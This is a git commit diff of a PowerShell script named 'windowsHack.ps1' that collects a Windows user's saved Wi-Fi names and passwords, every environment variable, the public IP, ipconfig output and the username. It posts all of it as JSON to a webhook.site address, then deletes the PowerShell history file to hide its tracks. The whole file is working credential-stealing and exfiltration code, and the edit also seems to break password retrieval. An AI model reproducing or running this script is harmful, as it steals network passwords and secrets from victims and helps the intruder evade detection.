c09d1a78b99eca952b492b3fca6d2bd4de0296f2
PeterGriffinAtGmailDotCom <156129816+PeterGriffinAtGmailDotCom@users.noreply.github.com>
2024-01-13 15:40:57 +0200

    Update windowsHack.ps1

--- windowsHack.ps1
+++ windowsHack.ps1
@@ -1,33 +1,33 @@
 $wifis = @()
-$profiles = netsh wlan show profiles | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
-  $_.Matches.Value
-}
+$profiles = netsh wlan show profiles | Select-String '(?<=All User Profile\s+:\s).+'
 foreach ($profile in $profiles) {
-  $password = netsh wlan show profile $profile key=clear | Select-String '(?<=Key Content\s+:\s).+' | ForEach-Object {
-    $_.Matches.Value.Trim()
-  }
-  $wifis += @{
-    'name' = $profile
-    'password' = $password
-  }
+    $password = netsh wlan show profile $profile -ErrorAction SilentlyContinue | Select-String '(?<=Key Content\s+:\s).+' -ErrorAction SilentlyContinue
+    if ($password) {
+        $password = $password.Matches.Value.Trim()
+    }
+    
+    $wifis += @{
+        'name' = $profile.Matches.Value
+        'password' = $password
+    }
 }
 
-$envVars = @{}
-gci env:* | ForEach-Object {
-  $envVars[$_.Name] = $_.Value
-}
+$envVars = gci env:* | ForEach-Object {
+    $_.Name, $_.Value
+} | ConvertFrom-Csv -Delimiter '=' -Header Name, Value
 
 $IPV4 = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
 $IPconfig = (ipconfig /all)
 
 $Body = @{
-  'username' = $env:username
-  'ipv4' = $IPV4
-  'wifi_profiles' = $wifis
-  'ipconfig' = $IPconfig
-  'env' = $envVars
+    'username' = $env:username
+    'ipv4' = $IPV4
+    'wifi_profiles' = $wifis
+    'ipconfig' = $IPconfig
+    'env' = $envVars
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)
 
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 0
 Remove-Item (Get-PSReadlineOption).HistorySavePath
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 1
